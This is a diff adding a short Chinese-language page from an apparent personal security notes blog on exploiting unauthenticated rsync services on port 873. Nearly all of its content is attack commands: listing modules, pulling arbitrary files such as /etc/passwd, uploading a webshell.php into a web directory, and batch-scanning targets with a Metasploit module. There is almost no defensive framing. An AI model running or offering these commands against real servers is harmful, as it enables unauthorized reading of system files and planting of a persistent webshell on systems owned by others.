@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>RCSYNC - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "RCSYNC", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u5229\u7528", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E6%A1%86%E6%9E%B6/%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E6%A1%86%E6%9E%B6/%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-link">
+        框架
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../NFS/NFS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../NFS/NFS/" class="btn btn-xs btn-link">
+        NFS
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="rcsync">RCSYNC</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#利用">利用</a><ul>
+<li><a href="#手动">手动</a></li>
+<li><a href="#msf">msf</a></li>
+</ul>
+</li>
+</ul>
+<p><code>Linux</code>下一款数据备份工具,默认监听<code>873</code>端口</p>
+<h2 id="_2">利用</h2>
+<h3 id="_3">手动</h3>
+<pre><code class="language-纯文本">rsync rsync://your-ip:873/
+rsync rsync://your-ip:873/src 来查看模块名列表
+我们再列出src模块下的文件
+rsync rsync://your-ip:873/src/
+
+我们可以下载任意文件或目录：
+rsync -av rsync://your-ip:873/src/etc/passwd ./
+rsync -avz rsync://ip:port/ /var/tmp
+
+上传文件到服务器：
+rsync -avz webshell.php ip::web/
+
+</code></pre>
+<h3 id="msf">msf</h3>
+<p>可以批量</p>
+<pre><code class="language-纯文本">msf &gt; use auxiliary/scanner/rsync/modules_list
+msf auxiliary(modules_list) &gt; show options
+    ... show and set options ...
+msf auxiliary(modules_list) &gt; set RHOSTS file:/root/url.txt
+msf auxiliary(modules_list) &gt; exploit
+
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E6%A1%86%E6%9E%B6/%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E6%A1%86%E6%9E%B6/%E6%A1%86%E6%9E%B6/" class="btn btn-xs btn-link">
+        框架
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../NFS/NFS/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../NFS/NFS/" class="btn btn-xs btn-link">
+        NFS
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
